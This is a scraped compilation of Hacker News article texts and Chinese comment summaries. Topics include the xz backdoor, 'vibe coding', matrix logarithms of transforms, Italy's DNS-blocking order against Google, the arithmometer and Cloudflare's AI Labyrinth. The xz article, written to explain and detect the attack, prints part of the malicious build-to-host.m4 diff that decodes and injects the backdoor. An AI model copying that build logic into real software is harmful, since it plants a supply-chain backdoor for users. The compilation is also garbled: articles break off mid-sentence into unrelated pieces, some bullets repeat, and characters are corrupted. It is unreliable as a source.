• nialv7：认为作者过于关注此次事件，而忽视了其他潜在风险。尽管NixOS未能检测到后门，但这不意味着NixOS将来能有效防御所有攻击。
• dataflow：质疑autoconf为何依赖xz，并认为这种依赖不合理。提出应通过手动审查命令行来提高安全性，而非依赖复杂工具。

43448075.article_content:
How NixOS and reproducible builds could have detected the xz backdoor
for the benefit of all
Published on 2025-03-20
Estimated reading time: 22mn
Introduction
In March 2024, a backdoor was discovered in
xz
, a (de)-compression software that is regularly used at the core of Linux distributions to unpack source tarballs of packaged software. The backdoor had been covertly inserted by a malicious maintainer under the pseudonym of
Jia Tan
over a period of three years. This event deeply stunned the open source community as the attack was both of
massive impact
(it allowed
remote code execution
on all affected machines that had
ssh
installed) and
extremely difficult to detect
. In fact, it was only thanks to the diligence (and maybe luck) of Andres Freund â a Postgres developer working at Microsoft â that the catastrophe was avoided: while investigating a seemingly unrelated 500ms performance regression in
ssh
that he was experiencing on several
Debian unstable
machines, he was able to trace it back to the
liblzma
library, identify the backdoor and document it.
While it was already established that the open source supply chain was often the target of malicious actors, what is stunning is the amount of energy invested by
Jia Tan
to gain the trust of the maintainer of the
xz
project, acquire push access to the repository and then among other perfectly legitimate contributions insert â piece by piece â the code for a very sophisticated and obfuscated backdoor. This should be a wake up call for the OSS community. We should consider the open source supply chain a high value target for powerful threat actors, and to collectively find countermeasures against such attacks.
In this article, Iâll discuss the inner workings of the
xz
backdoor and how I think we could have mechanically detected it thanks to build reproducibility.
How does the attack work?
The main intent of the backdoor is to allow for
remote code execution
on the target by hijacking the
ssh
program. To do that, it replaces the behavior of some of
ssh
âs functions (most importantly the
RSA_public_decrypt
one) in order to allow an attacker to execute arbitrary commands on a victimâs machine when some specific RSA key is used to log in. Two main pieces are combined to put together to install and activate the backdoor:
A script to de-obfuscate and install a malicious object file as part of the
xz
build process.
Interestingly the backdoor was not comprehensively contained in the source code for
xz
. Instead, the malicious components were only contained in tarballs built and signed by the malicious maintainer
Jia Tan
and published alongside releases
5.6.0
and
5.6.1
of
xz
. This time the additional release tarball contained slight and disguised modifications to extract a malicious object file from the
.xz
files used as data for some test contained in the repository.
A procedure to hook the
RSA_public_decrypt
function.
The backdoor uses the
ifunc
mechanism of
glibc
to modify the address of the
RSA_public_function
when
ssh
is loaded, in case
ssh
links against
liblzma
through
libsystemd
.
Info
The rest of this section goes into the details of the two steps mentionned. Reading it is not necessary to understand the rest of the article. The most important takeaway here is that the backdoor was only active when using the maintainer-provided release tarball.
1. A script to de-obfuscate and install a malicious object file as part of the
xz
build process
As explained above, the malicious object file is stored directly in the
xz
git repository, hidden in some test files. The project being a decompression software, test cases include
.xz
files to be decompressed, making it possible to hide some machine code into fake test files;
The backdoor is not active in the code contained in the git repository, it is only included by building
xz
from the tarball released by the project
, which has a few differences with the actual contents of the repository, most importantly in the
m4/build-to-host.m4
file.
diff --git a/m4/build-to-host.m4 b/m4/build-to-host.m4
index f928e9ab..d5ec3153 100644
--- a/m4/build-to-host.m4
+++ b/m4/build-to-host.m4
@@
-1,4 +1,4
@@
-
# build-to-host.m4 serial 3
+
# build-to-host.m4 serial 30
dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
dnl This file is free software; the Free Software Foundation
dnl gives unlimited permission to copy and/or distribute it,
@@
-37,6 +37,7
@@
AC_DEFUN([gl_BUILD_TO_HOST],
dnl Define somedir_c.
gl_final_[$1]="$[$1]"
+
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
dnl Translate it from build syntax to host syntax.
case "$build_os" in
cygwin*)
@@
-58,14 +59,40
@@
AC_DEFUN([gl_BUILD_TO_HOST],
if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
[$1]_c_make='\"$([$1])\"'
fi
+
if test "x$gl_am_configmake" != "x"; then
+
gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+
else
+
gl_[$1]_config=''
+
fi
+
_LT_TAGDECL([], [gl_path_map], [2])dnl
+

主要讨论点：数学方法在物理学中的应用及其学习方式

不同观点：
• ecshafer认为数学方法课程对物理学学习非常重要，提供了许多在常规数学课程中难以接触到的实用工具和概念（如勒让德多项式、贝塞尔函数、拉格朗日函数等），并将其比喻为为解决问题提供的“超级工具”。该用户强调这些工具对物理学相关领域的问题解决非常实用，类似于为学习者提供了更多的工具。

• Koshkin表达了对在线数学方法讲义的热爱，认为每次阅读都会有新的收获，类似于永不过时的故事。该评论强调了这些讲义的持久价值和学习过程中的不断发现。

• owl_vision简单提到了一本具体数学的书籍，提供了一个学习资源，但没有深入讨论其内容或价值。

• BewareTheYiga认为某个资源可以很好地补充Arfken & Weber的书，暗示这些资源在学习过程中可以互补使用，增强学习效果。

• rramadass提到了Alec J. Schramm的《Mathematical Methods and Physical Insights: An Integrated Approach》一书，询问其他人的意见，显示出对不同学习资源的兴趣和探讨。

• MollyGodiva批评了一些学习材料中手绘图表的质量问题，认为使用计算机制作图表更为合适，强调了学习材料的视觉质量对学习体验的影响。

• BewareTheYiga认为某个资源可以很好地补充Arfken & Weber的书，暗示这些资源在学习过程中可以互补使用，增强学习效果。

• rramadass提到了Alec J. Schramm的《Mathematical Methods and Physical Insights: An Integrated Approach》一书，询问其他人的意见，显示出对不同学习资源的兴趣和探讨。

• MollyGodiva批评了一些学习材料中手绘图表的质量问题，认为使用计算机制作图表更为合适，强调了学习材料的视觉质量对学习体验的影响。

• paulpauper对自学方式的效果提出质疑，认为在没有正式教学的情况下，通过自学达到大学水平数学/物理的精通是非常困难的，通常会存在知识 gaps或理解障碍。该评论对自学方式的效果持怀疑态度。

补充讨论：
• 讨论中涉及了多个学习资源和书籍，显示出学习者对不同资源的需求和评价。
• 自学与正式教学效果的争议是讨论中的一个焦点，paulpauper的观点与其他强调自学价值的评论形成对比。
• 学习材料的质量，特别是视觉材料的质量，也在讨论中被提及，显示出学习者对学习体验的全面关注。

data.title: “Vibe Coding” vs. Reality
data.author: birdculture
data.article_summary: "Vibe Coding" vs Reality"讨论了一种在社交媒体上流行的趋势，即依赖大型语言模型（LLM）通过自然语言描述自动生成代码，被称为“Vibe Coding”。这种方法主张放弃对具体代码的关注，拥抱指数级技术进步，依赖AI代理自动完成任务。尽管LLM工具（如Cursor、GitHub等）让软件开发变得更加便捷，用户可以通过简单描述生成网站或项目，但这种方法存在不切实际的幻想和过度炒作。文章批评这种趋势源于懒惰和自欺，认为代理自主完成任务的能力被高估，实际无法满足企业的技术需求。最终，依赖这种方法的创业者可能缺乏真正的技术能力，无法建立可持续的业务。
data.comments_summary:
主要讨论点：LLM（大型语言模型）在编程中的实际效果与宣传效果之间的差距，以及LLM对编程工作的影响。

不同观点：
• rtfeldman：认为关于AI提升编程生产力的宣传（如10x、100x速度提升）过于夸张。他通过逻辑分析和实例（如YC合伙人的言论）指出，这些声称是不准确的，因为如此巨大的生产力提升是显而易见的，不需要自我报告。
• MarkMarine：认为LLM在编程中最终会超越人类，虽然目前“氛围编程”（vibe coding）还不现实，但随着模型的改进，未来会实现。他引用了AlphaDev的例子来说明模型在某些领域已经超越人类。
• Etheryte：将LLM的炒作与过去企业对外包的炒作相比较，认为当前对LLM编程的讨论过于 hype，现实往往不如宣传。
• bglazer：分享了自己使用Claude和OpenAI模型转换代码的失败经历，指出这些模型在处理复杂代码转换时的表现不佳。
• redleggedfrog：指出一些开发者过度依赖LLM导致代码质量下降，甚至因此被解雇。强调LLM可以提高效率，但需要谨慎使用。
• mr_mitm：认为“氛围编程”可以完成80%的概念验证工作，但要生产可靠、安全的软件，仍需要有经验的开发者。
• axegon_：批评“氛围编程”这一术语，并指出80%的工作只是概念验证，远不是完整的软件开发。
• gooseus：认为如果有扎实的编码和测试知识，可以利用LLM提高效率，减少负面影响。
• scoofy：质疑是否真的有人认为LLM可以编写复杂程序。
• jfengel：对“氛围编程”这一新术语表示不满。
• 18172828286177：分享了一个因使用LLM工具导致一系列问题的例子，疑似 troll。
• mentalgear：指出如果LLM工具真如宣传那样有效，相关公司就不会大量招聘开发者。
• jxjnskkzxxhx：认为批评LLM工具的缺陷是徒劳的，因为这些缺陷会很快被修复，并建议反对者可能是出于对被取代的恐惧而反对。
• brentm：对“氛围编程”这一术语表示极度反感。
• liendolucas：认为只有通过 dedication 和不断学习才能真正掌握编程，批评那些依赖LLM而不深入学习的人。

补充讨论：
• 争议的焦点在于LLM在编程中的实际效果与宣传效果之间的差距。一些人认为LLM可以显著提高生产力，而另一些人则认为这些宣传过于夸张，现实往往不如预期。
• “氛围编程”这一概念引发了广泛讨论，有人认为这是LLM在编程中的一个重要应用场景，而另一些人则批评这一概念不切实际，且会导致代码质量下降。
• 讨论中多次提到LLM工具的缺陷和使用这些工具需要谨慎，强调有经验的开发者在确保代码质量中的重要性。
• 一些评论者对LLM工具的快速改进持乐观态度，认为批评者可能是出于对被取代的恐惧，而另一些人则对这一技术持怀疑态度，强调需要深入学习和实践才能真正掌握编程技能。

43448432.article_content:
"Vibe Coding" vs Reality
Published Mar 19, 2025
- 11 min read -
Text Only
Table of contents
"Vibe Coding" vs Reality
Working around the problem
Conclusion
There's a trend on social media where many repeat
Andrej Karpathy's words
(
archived
): "give in to the vibes, embrace exponentials, and forget that the code even exists." This belief — like many flawed takes humanity holds — comes from laziness, inexperience, and self-deluding imagination. It is called "Vibe Coding."
"Embrace the exponentials" sounds like it came from an NFT junkie.
Like the NFT crowd, there is a bubble of unreality they cling to justifying their perception of the world.
Producing software is now more accessible as newer tools allow people to describe what they want in a natural language to a large language model (LLM). This idea is catching on because LLM agents are now accessible to anyone willing to subscribe to vendors like
Cursor
,
GitHub
, Windsurf, and others. These editors have an "agent" option where users can request something and in response changes are made to the appropriate files, rather than only the file currently in focus. Over time, the agent will request to run commands to run tests or even run scripts it previously wrote to the file system, much as you would if you were solving the problem.
In 2022, folks could copy code into
ChatGPT
and ask questions or for rewrites.
In 2023, folks could ask it to review and edit a single file with an IDE integration like Copilot.
In 2024 and 2025, folks could ask it to solve a specific problem in the project and have it find out what files to edit, edit them, then verify its own work, and correct any mistakes it made with feedback from linting errors and unit tests.
With LLM agents having so much capability, people can delegate the idea of refining their imprecise ideas to a precise implementation elaborated by an LLM through "Vibe Coding."
Justine Moore
@venturetwins
@twitter.com
@a16z
@stuffyokodraws
First - what is vibe coding?
A concise definition from
@stuffyokodraws
, and then an exploration of how technical vs. non-technical users approach these tools.
Thursday, Mar 13, 2025
If you open a blank folder and tell it to set up an initial project, it can do a lot at once. With no rules, no patterns to mimic, and no constraints, it can produce something that feels more tailored for you in minutes than
npx create-react-app
ever could.
With a simple instruction like "I want to create a website for my ski resort" and about ten minutes of having it massage errors of its own making, I can have just that.
These leaps of progress are what fuels the "Vibe Coding" idea. To go from nothing to something shareable and personal sounds incredible.
This moment provided a thrill I hadn't experienced in a long time when coding. However, this excitement drained quickly the further I got from a blank canvas.
Agents, as a concept, aren’t new.
Google IO made up buzzwords
like
"agentic era"
(
archived
) to describe this concept. It has been realized through open technologies like
AutoGPT
,
XAgent
, and
more recently by Anthropic
with the
Model Context Protocol
(MCP).
When the model can interact with more than just a person who proxies their outputs into different domains, it is autonomous. If it can perform searches on the web or in a codebase, it can enrich its own context with the information it needs to fulfill the current request. Further, when it can commit outputs and then gain immediate and automatic feedback on those outputs, it can refine its solution without a person intervening.
There are actions that do prompt the user for consent before proceeding, such as running commands in the console or deleting files. This consent can be pre approved with a mode called "YOLO."
A mode for "You Only Live Once"!? Really?
You can witness this autonomy for yourself today in Cursor.
The agent concept has merit and today can deliver proofs of concept that
VC firms like Y-Combinator
will invest in — proofs of concept that are trash by unskilled founders hoping to win the lottery while living the life of leisure.
Sebastian
@sebastianvolkis
@twitter.com
I’ve cracked vibe coding, TrendFeed has almost hit its first 10k month, and Ai built the entire thing
Im just sitting here sipping coffee, coding with Ai + MCP
Also more time to shitpost on X haha
Thursday, Mar 13, 2025
The optimal technical founder for a VC is not the 10x engineer. It is someone who'll deliver
enough
of a product to test its fitness in the market and then succeed in raising more investment money. Their execution on their vision and hiring prowess is more important than their technical skillset.
The execution of agents today is over-hyped and does not hold up to the needs of any functioning businesses which need experts to develop and maintain their technical capabilities instead of single points of failure on the internet.
Ian Nuttall
@iannuttall
@twitter.com
babe, come to bed
i can't, i'm vibe coding
Thursday, Mar 13, 2025
These models are trai

data.title: Derivatives and Logarithms of 3D Transforms
data.author: nosferalatu123
data.article_summary: 这篇文章讨论了如何对一个变换 \(T\) 进行平滑插值，从而使点 \(x\) 从初始位置逐渐移动到由 \(T\) 变换后的位置。具体方法是使用变换的指数和对数函数来计算随时间变化的变换 \(T(t)\)，公式为 \(x(t) = e^{\log(T) \cdot t} \cdot x(0)\)。这里，\(\log(T)\) 表示变换的速率（或切向量场），它描述了每个点在空间中的速度。通过这个方法，可以在任意时间 \(t\) 计算点 \(x\) 的位置及其速度（即 \(\log(T) \cdot x(t)\)）。文章还提供了一个交互式示例和代码实现，展示了如何利用变换的指数和对数来计算插值变换和速度向量场。
data.comments_summary:
主要讨论点：指数映射和对数映射在矩阵和变换中的应用

不同观点：
• [ndriscoll] 提出指数函数可以通过极限定义来理解，特别是在如复利计算的背景下。这种方法强调了矩阵A或对数变换T作为从单位矩阵偏移的方向，而指数映射则是无穷多次的微小偏移的组合。

• [MITSardine] 对计算矩阵指数的方法进行了补充，提到了C Moler和C Van Loan的经典文章，并指出级数展开法只要处理得当并不脆弱。同时，讨论了矩阵指数映射中的插值方案，认为exp(tlog(A) + (1-t)log(B))在某种意义上是最短路径，并引用了V Arsigny等人的研究支持其观点。对exp(log(BA^{-1})t)A这种形式提出质疑，认为其不如直接使用凸组合的exp(sum_i x_i log(A_i))优雅。

• [lenkite] 对Java Applet技术仍被使用表示惊讶，指出许多用户可能比这项技术更年轻，暗示技术发展的快速变迁。

• [moktonar] 提出将变换分解为轴向平移、螺旋转动和定向拉伸，并认为每种变换都可以通过直接的插值方法处理，如线性插值、角插值和指数插值。

• [xeonmc] 补充了螺钉理论（Screw Theory）作为相关的理论背景，提供了一个维基百科链接供进一步阅读。

补充讨论：
• 争议的焦点之一在于矩阵指数映射中插值方案的优劣和适用性，特别是exp(tlog(A) + (1-t)log(B))和exp(log(BA^{-1})t)A这两种方法的比较。
• 讨论中还涉及到计算矩阵指数的实际算法和数值稳定性问题，包括级数展开法和缩放平方法。
• 螺钉理论被引入作为理解和处理复杂变换的一种理论框架，提供了另一种视角。

43430498.article_content:
Given a transform
\(T\)
and a point x, we can find the transformed point with
\(T * x\)
. But what if we want to smoothly interpolate
\(T\)
so it moves
\(x\)
along the path from its initial position to its position transformed by
\(T\)
?
What we want to find is the point
\(x\)
at time
\(t\)
:
\(x(t) = T(t) * x(0)\)
where
\(x(0)\)
is the point’s initial position, and
\(T(t)\)
is the transform at time
\(t\)
. Since we have only a single transform
\(T\)
, we need to find a way to interpolate it over time.
One way to accomplish this is to raise
\(T\)
to the power of
\(t\)
, which can be done using the exponential and logarithm of the transform. Interestingly, the logarithm of a transform can also be used to easily find the velocity of a point
\(x\)
in space: the velocity vector (also called the tangent vector) is just
\(log(T) * x\)
. This blog post shows the relationship between the logarithm and velocity.
Example
Check out this interactive example to see how the vector field changes as you manipulate the gizmo to translate and rotate the transform. The vector field represents the velocity vector at each point in space during the transformation.
As you move the gizmo, you’ll notice a white curve that traces the path from the origin to the gizmo’s transform. Along this curve, you’ll see the interpolated transform as it travels from the origin to the gizmo. As you can see, the interpolation follows the flow of the velocity vector field. The applet’s code is using the exponential and logarithm of the transform to compute the curve, interpolated transform, and vector field.
The source code for the applet can be found
here
, which includes an implementation of closed-form log() and exp() for rigid body transforms.
Next, I’ll describe how to compute the interpolated transform and the velocity vector field you see in this example.
What’s
\(T(t)\)
?
We have
\(T\)
, but not
\(T(t)\)
, which changes with time. Assuming that multiplying two transforms represents the composition of those transforms, we can find
\(T(t)\)
by saying
\(T(0) = I\)
(the identity transform)
\(T(1) = T\)
\(T(2) = T * T\)
\(T(3) = T * T * T\)
More generally, we can find
\(T\)
at any time by saying
\(T(t) = T^t\)
.
The above trick is from a blog post by Fabian Giesen
here
but works for any transform that uses multiplication for composition.
Now that we know
\(T(t) = T^t\)
, the original equation can be rearranged to
\(x(t) = T^t * x(0)\)
.
What’s
\(T^t\)
?
To compute
\(T^t\)
, we need to use the matrix exponential and matrix logarithm.
Let’s start with two facts about a matrix X:
\(e^{log(X)} = X\)
and
\(log(X^y) = log(X) * y\)
.
Put together, we can say that
\(T^t = e^{log(T^t)} = e^{log(T)*t}\)
which we can plug into the earlier equation, giving us
\(x(t) = e^{log(T) * t} * x(0)\)
.
This says that to find the point x at time t, find the transform at time t using
\(e^{log(T) * t}\)
, and use that to transform the point at its initial position (at time 0).
What’s the derivative?
In calculus, we learned that
\(\dfrac{d}{dt}e^{a t} = a e^{a t}\)
which holds true for matrices as well:
\(\dfrac{d}{dt}e^{A t} = A e^{A t}\)
This relationship is explained in more detail in the section
the derivative of the matrix exponential
.
We can use this property to find the derivative of our earlier equation
\(x(t) = e^{log(T)t} x(0)\)
with respect to t:
\(\dfrac{d}{dt}x(t) = log(T) e^{log(T) t} x(0)\)
.
This equation states that to find the first derivative (the velocity vector, also called the tangent vector) of the point at time t, you first transform the point’s initial position
\(x(0)\)
with the interpolated transform
\(e^{log(T)t}\)
and then multiply it by the logarithm of the transform
\(log(T)\)
. This expression follows the right-to-left convention of column vectors, so you would start with the initial position
\(x(0)\)
, then apply the interpolated transform
\(e^{log(T)t}\)
, and finally multiply by the logarithm
\(log(T)\)
.
\(e^{log(T) t}\)
acts as an operator that maps points from their initial position to their new position at time t. The matrix exponential can be thought of as like integration. At time 0,
\(e^{log(T) t}\)
is the identity matrix (
\(e^0=I\)
for matrix exponentials), and at time 1.0,
\(e^{log(T) t}\)
is equal to the original transform matrix T (
\(e^{log(T)}=T\)
).
What’s this all mean?
If we take the equation at the end of “What’s
\(T^t\)
?”
\(x(t) = e^{log(T) t} x(0)\)
and substitute that into the equation at the end of “What’s the derivative?”

data.title: Italy demands Google poison DNS under strict Piracy Shield law
data.author: DanAtC
data.article_summary: 意大利利用《盗版盾牌》法律对谷歌采取行动，米兰法院命令谷歌立即开始对其公共DNS服务器进行“毒化”，以阻止非法足球赛事直播。这是针对谷歌及其他国际公司（如Cloudflare）的最新举措，旨在打击盗版，但已造成附带损害。意大利通信监管机构AGCOM赞扬该裁决，并希望继续对国际科技公司施压。AGCOM指控谷歌未能在规定时间内屏蔽盗版网站，法院因此作出该裁决，未给予谷歌申辩机会。类似案件也曾针对Cloudflare，若不遵守可能面临每日高达1万欧元的罚款。谷歌尚未对此发表评论。
data.comments_summary:
主要讨论点：欧洲对互联网服务（如Cloudflare）的司法管辖和其对盗版行为的打击措施，以及关于互联网监管和创新的争议。

不同观点：
• **djoldman**：质疑意大利的司法管辖权，指出Cloudflare在意大利没有实体存在，因此怀疑意大利能否合法对其罚款。
• **perching_aix**：认为这一决定可能代表了一种新的低点，但对是否存在类似的先例表示疑问。
• **antirez**：支持意大利的决定，认为这是针对版权侵害的合法行动，并指出该行动针对的是有组织犯罪，而非个人用户。认为这是打击盗版行为，而非简单的互联网监管。
• **bakugo**：批评因一小群贪婪的人导致欧洲的互联网审查加剧，但同时承认像Google和Cloudflare这样的大公司有时也能在抵制这类法律中起到正面作用。
• **xvector**：批评欧洲缺乏创新，过度依赖监管，认为这导致了技术政策制定的荒谬性增加。
• **ur-whale**：主张DNS应该去中心化，提出DNS应允许用户自由选择提供商，并建议现代DNS应基于无信任的区块链基础设施，提到Namecoin作为一个未成功的早期尝试。
• **stalfosknight**：表达对欧洲监管互联网的不满，认为欧洲应解决未满足的市场需求，而不是干扰自由和开放的互联网。
• **Kenji**：提出DOH（DNS over HTTPS）作为绕过DNS审查的工具，分享个人经验表明DOH能有效绕过审查。

补充讨论：
• **关于盗版和犯罪组织**：antirez指出，此案涉及有组织犯罪通过盗版内容牟利，而非简单的个人用户观看盗版内容，强调这是合法的打击盗版行动。
• **关于技术解决方案**：ur-whale和Kenji提出了技术解决方案，如去中心化DNS和使用DOH来绕过审查，反映出技术社区对监管措施的技术应对策略。
• **关于欧洲监管环境**：多个评论（xvector、stalfosknight）批评欧洲的监管环境，认为过度监管抑制了创新，并导致了不必要的互联网审查。

争议焦点：
• **司法管辖权的合法性**：djoldman对意大利能否对没有实体存在的公司罚款表示质疑。
• **监管的合理性**：部分评论（xvector、stalfosknight）认为欧洲的监管过度，抑制了创新，而另一些评论（antirez）则认为这是打击盗版和保护版权的必要措施。
• **技术解决方案的可行性**：ur-whale提倡DNS去中心化，而Kenji则分享了使用DOH绕过审查的实际经验，反映出技术社区在应对监管方面的不同策略。

Italy is using its Piracy Shield law to go after Google, with a court ordering the Internet giant to immediately begin poisoning its public DNS servers. This is just the latest phase of a campaign that has also targeted Italian ISPs and other international firms like Cloudflare. The goal is aimed at preventing illegal football streams, but the effort has already caused collateral damage. Regardless, Italy's communication regulator praises the ruling and hopes to continue sticking it to international tech firms.
The Court of Milan issued this ruling in response to a complaint that Google failed to block pirate websites after they were identified by the national communication regulator, known as AGCOM. The court found that the sites in question were involved in the illegal streaming of Series A football matches, which
has been a focus
of anti-piracy crusaders in Italy for years. Since Google offers a
public DNS service
, it is subject to the site-blocking law.
Piracy Shield is often labeled as draconian by opponents because blocking content via DNS is messy. It blocks the entire domain, which has led to confusion when users rely on popular platforms to distribute pirated content. Just last year, Italian ISPs briefly blocked the entire Google Drive domain because someone, somewhere used it to share copyrighted material. This is often called DNS poisoning or spoofing in the context of online attacks, and the outcome is the same if it's being done under legal authority: a DNS record is altered to prevent someone typing a domain name from being routed to the correct IP address.
Spotted by
TorrentFreak
, AGCOM Commissioner Massimiliano Capitanio
took to LinkedIn
to celebrate the ruling, as well as the existence of the Italian Piracy Shield. "The Judge confirmed the value of AGCOM's investigations, once again giving legitimacy to a system for the protection of copyright that is unique in the world," said Capitanio.
Capitanio went on to complain that Google has routinely ignored AGCOM's listing of pirate sites, which are supposed to be blocked in 30 minutes or less under the law. He noted the violation was so clear-cut that the order was issued without giving Google a chance to respond, known as
inaudita altera parte
in Italian courts.
This decision follows a similar case against Internet backbone firm Cloudflare. In January, the Court of Milan found that Cloudflare's CDN, DNS server, and WARP VPN were facilitating piracy. The court threatened Cloudflare with fines of up to 10,000 euros per day if it did not begin blocking the sites.
Google could face similar sanctions, but AGCOM has had difficulty getting international tech behemoths to acknowledge their legal obligations in the country. We've reached out to Google for comment and will update this report if we hear back.
Ryan Whitwam
Senior Technology Reporter
Ryan Whitwam
Senior Technology Reporter
Ryan Whitwam is a senior technology reporter at Ars Technica, covering the ways Google, AI, and mobile technology continue to change the world. Over his 20-year career, he's written for Android Police, ExtremeTech, Wirecutter, NY Times, and more. He has reviewed more phones than most people will ever own. You can
follow him on Bluesky
, where you will see photos of his dozens of mechanical keyboards.

data.title: Making the Arithmometer Count
data.author: gene-h
data.article_summary: 本文讨论了查尔斯·泽维尔·托马斯（Charles Xavier Thomas de Colmar）的算术仪（arithmometer）在19世纪计算历史中的重要性。尽管巴贝奇的差分机和分析机受到更多关注，但算术仪作为首个商用成功的计算器，其历史地位不可忽视。然而，算术仪的成功并非一帆风顺，它在发明后的五十多年中经历了多次机械和市场定位的转变。尽管1820年首次公开，但直到1870年代末才被广泛接受和复制。本文聚焦于算术仪的机械发展、市场推广及其被用户采纳的过程，揭示了其成为可靠计算工具所需的技术、推广和个人投资。算术仪的核心设计包括输入数字的滑动器和显示结果的可移动托架，通过莱布尼茨的阶梯圆柱实现计算。托马斯不断调整设计，重新定义机器的特性和市场目标。
data.comments_summary:

不同观点：
• classichasclass认为这款设备很有趣，但他个人更偏好于20世纪40到50年代生产的小型金属算术仪（arithmometers），尤其是那些使用手写笔的款式。这表明他对复古设备有特殊情感，可能更欣赏其历史价值和机械操作的独特性。

补充讨论：
• 评论中提到了两类计算设备：现代设备与复古的金属算术仪。classichasclass的偏好反映了部分用户对具有机械操作和历史背景的设备有特别的喜爱，而现代设备可能更多关注功能性和技术创新。

The following was published as Stephen Johnston, ‘Making the arithmometer count’,
Bulletin of the Scientific Instrument Society
, 52 (1997), 12-21. A shortcut to the images is available in an online
gallery
. For an actively developing website on the Thomas arithmometer, with (among many other things) a listing of surviving examples, see ValÃ©ry Monnier’s

.
Making the arithmometer count
Introduction
The arithmometer of Charles Xavier Thomas de Colmar (1785-1870) has a firmly established place in the history of computing. While the lion’s share of recent scholarly attention has been lavished on Charles Babbage’s difference and analytical engines, historians examining calculation in the 19th century have nevertheless repeatedly affirmed the importance of Thomas’s device. Typical characterisations are remarkably uniform: ‘the first multiplication machine to be made commercially for general sale’, ‘the first commercially successful calculator’ and ‘the first commercial calculating machine’.
1
The arithmometer was not however the first machine to accomplish the four basic arithmetical operations of addition, subtraction, multiplication and division â earlier machines such as those of Hahn and Müller had achieved this level of functionality in the 18th century.
2
But the implied virtues of the arithmometer are clear. Lacking the mathematical ambition driving the work of Babbage and his followers, the machine was solid, dependable and successful, an industrial product manufactured in quantity.
Yet despite this apparent consensus there are striking problems with standard accounts of the arithmometer. Rather than a smooth passage to success, I will suggest that the machine’s early decades witnessed a different and more troubled trajectory, in which the mechanical and public character of the arithmometer was repeatedly transformed. This process of development took place over an extraordinarily protracted period. Although first made public in 1820, a lengthy report of 1878 remarked that the arithmometer had still not taken its ‘rightful’ place in industry.
3
Perhaps this perception of failure should be attributed to the overoptimistic expectations of a sympathetic advocate. But the widespread acceptance of the arithmometer cannot be dated much before the late 1870s. Only then was the machine deemed sufficiently successful to be worth copying, when arithmometer ‘clones’ were first manufactured in Germany by Burkhardt and, slightly later, in Britain.
4
In this paper I focus on the period of more than 50 years between the invention of the machine and its establishment as an accepted instrument of calculation. I examine three aspects of the arithmometer’s early history: its development as a mechanism, the means used to publicly promote it and the concrete ways in which it was adopted by an expanding circle of users. This multiple approach seeks to reveal the technical, promotional and personal investment required before the arithmometer could be ‘counted on’, not just in the straightforward arithmetical sense but also counted on as a reliable resource for a whole range of potential users.
Design and development
Examples of the arithmometer survive in many public and private collections. Yet despite its easily recognisable outward appearance, we should be wary of discussing
the
arithmometer, as if the machine existed in a single unchanging form. A few of the machine’s basic principles did remain constant but almost every feature of their implementation was altered by Thomas. Moreover, the long list of internal and external changes does not represent simply a uniform sequence of improvement. In some of the most important instances of redesign Thomas did not just rectify or add to an existing model; rather, he attempted to redefine the character and the ambitions of the machine, and thus its possible market.
Figure 1
Figure 2
The familiar features of the mature version of the arithmometer provide a convenient standpoint from which to survey its changing form and operation. The machine presents two principal parts, a fixed setting plate with a series of sliders for inputting numbers (fig. 1: A), and a movable carriage where results appear (fig. 1: M). A number set with the sliders is mechanically transferred to the result dials on the carriage (fig. 1: C) by turning the handle (fig. 1: N). This transfer operation, basic to all the arithmometer’s workings, is accomplished using the celebrated stepped cylinders first introduced by Leibniz.
Each cylinder carries 9 teeth whose length increases stepwise (fig. 2: A). The cylinder’s teeth engage a pinion (fig. 2: B) whose position is controlled by the setting slider (fig. 2: C). The higher the number set by the slider, the larger the number of teeth on the cylinder engaging the pinion. data.title: Trapping misbehaving bots in an AI Labyrinth
data.author: pabs3
data.article_summary: Cloudflare推出了一种新的缓解措施——"AI迷宫"（AI Labyrinth），利用AI生成的内容来减缓、迷惑并浪费不当爬取网站数据的AI爬虫的资源。当检测到可疑爬虫活动时，系统会自动引导这些爬虫进入一系列由AI生成的假页面，消耗其计算资源，同时保护真实网站内容。这种方法不仅能有效干扰爬虫，还能作为“蜜罐”帮助识别和标记恶意爬虫。生成的内容涉及多样主题，并通过预生成管道存储以确保安全和性能，同时避免误导性信息传播。系统隐藏这些链接，不影响正常用户体验，并通过机器学习不断提升爬虫检测能力。
data.comments_summary:
主要讨论点：针对网络中反爬虫机制、误导数据集、无障碍访问问题以及对AI生成内容和反制措施的讨论。

不同观点：
• __MatrixMan__ 提到 Neal Stephenson 的小说《Anathem》中的“bogons”概念，即误导数据集，并试图寻找其来源的合理解释。这与故事主题相关，但没有说明这些数据集是如何产生的。
• karaterobot 关注隐藏链接对使用屏幕阅读器的用户的影响，尤其是当Cloudflare将用户误认为机器人时，这些隐藏链接是否会干扰屏幕阅读器的使用。
• zzo38computer 提出如果禁用CSS，这些隐藏链接将如何处理的问题，因为其经常禁用CSS，这可能影响到浏览体验。
• darth_avocado 建议通过让机器人观看广告来阻止爬虫，类似于人类用户需要完成的验证。
• visarga 将这种反制措施比作烧毁房屋以防止占用，并提到可能导致的极端互不信任，还提到图像处理以破坏模型训练的类似做法。
• ccgreg 提出通过收集无跟随链接并利用其获利的可能性，暗示这种反制措施可能被利用。
• d4rkn0d3z 对如何检测未经授权的爬取表示疑问，关注反爬虫技术的实现细节。
• seasluggy 和 darth_avocado 对“人类不会深入AI生成的无意义内容”的说法表示怀疑。
• __MatrixMan__ 进一步提出可以在AI实验室环境中使用提示注入攻击。
• callamdelaney 提到已有项目实现了类似的反制措施，而不需要使用AI。
• wyes 关注AI搜索在特定时间段内减少的现象，并试图理解其原因。
• momojo 讨论这种反制措施在阻止爬虫方面的有效性，并询问实际操作中是否可行，尤其是当爬虫速度慢于人类用户时。
• bob1029 进一步探讨如何应对不关心速度的爬虫，并质疑这种反制措施在面对完美模拟用户代理的情况下是否有效，甚至担心被Turing测试频繁验证。

补充讨论：
• theyknowitsxmas 提到反爬虫技术的开关功能失效问题，指出实际操作中可能遇到的技术故障。

争议焦点：
• 反爬虫机制的有效性和对正常用户体验的影响，尤其是对使用屏幕阅读器的用户和禁用CSS的用户。
• 误导数据集和反制措施在实际应用中的可行性和可能被滥用的风险。
• 对AI生成内容和反制措施的伦理和实际效果的讨论。

43411725.article_content:
Trapping misbehaving bots in an AI Labyrinth
2025-03-19
